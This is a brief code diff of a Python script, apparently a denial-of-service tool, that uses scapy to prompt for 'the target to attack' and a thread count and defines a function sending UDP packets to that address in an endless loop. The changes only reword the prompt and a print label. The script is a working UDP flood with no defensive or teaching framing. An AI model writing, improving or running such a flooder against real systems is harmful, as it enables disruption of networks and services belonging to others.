@@ -1,11 +1,12 @@
 from scapy.all import *
 import threading
 
-ip=input("ip: ")
+ip = input("Enter the target to attack: ")
 thr = int(input("Thread: "))
+
 def udp(address, i) :
     while True:
-        print('Thread: ', i)
+        print('Threading: ', i)
         ip=IP(dst=address)
         packet=ip/UDP()
         send(packet)
